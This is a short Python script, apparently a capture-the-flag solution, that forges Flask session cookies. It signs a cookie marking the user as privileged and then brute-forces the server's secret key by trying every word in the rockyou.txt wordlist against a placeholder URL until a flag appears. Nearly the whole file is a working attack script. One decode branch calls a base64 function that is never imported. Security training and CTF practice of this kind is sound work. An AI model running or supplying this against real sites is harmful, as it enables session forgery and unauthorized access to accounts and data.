
import requests
import sys
import zlib
from itsdangerous import base64_encode
import ast
#external import
from flask.sessions import SecureCookieSessionInterface 


class MockApp(object):

    def __init__(self, secret_key):
        self.secret_key = secret_key


def decode( session_cookie_value, secret_key=None):
        """ Decode a Flask cookie  """
        try:
            if(secret_key==None):
                compressed = False
                payload = session_cookie_value

                if payload.startswith('.'):
                    compressed = True
                    payload = payload[1:]

                data = payload.split(".")[0]

                data = base64_decode(data)
                if compressed:
                    data = zlib.decompress(data)

                return data
            else:
                app = MockApp(secret_key)

                si = SecureCookieSessionInterface()
                s = si.get_signing_serializer(app)

                return s.loads(session_cookie_value)
        except Exception as e:
            return "[Decoding error] {}".format(e)
            raise e


def encode(secret_key, session_cookie_structure):
        """ Encode a Flask session cookie """
        try:
            app = MockApp(secret_key)

            session_cookie_structure = dict(ast.literal_eval(session_cookie_structure))
            si = SecureCookieSessionInterface()
            s = si.get_signing_serializer(app)

            return s.dumps(session_cookie_structure)
        except Exception as e:
            return "[Encoding error] {}".format(e)
            raise e

print("Try encode : "+encode("secret_key","{'asdf':'asdf'}"))


payload = '{"flagship": True, "username": "phulelouch"}'

new_cookie = encode("some_secret_key",payload)
print("Payload: "+new_cookie)

with open("/usr/share/wordlists/rockyou.txt") as handle:
	lines = [ l.strip() for l in handle.readlines() ]
	for secret_key in lines:
		new_cookie = encode(secret_key,payload)
		print('Trying secret key {}'.format(secret_key))
		r = requests.get("someurl", cookies={"session":new_cookie})

		if 'flag{' in r.text:
			print('Got flag')
			print(r.text)
			break
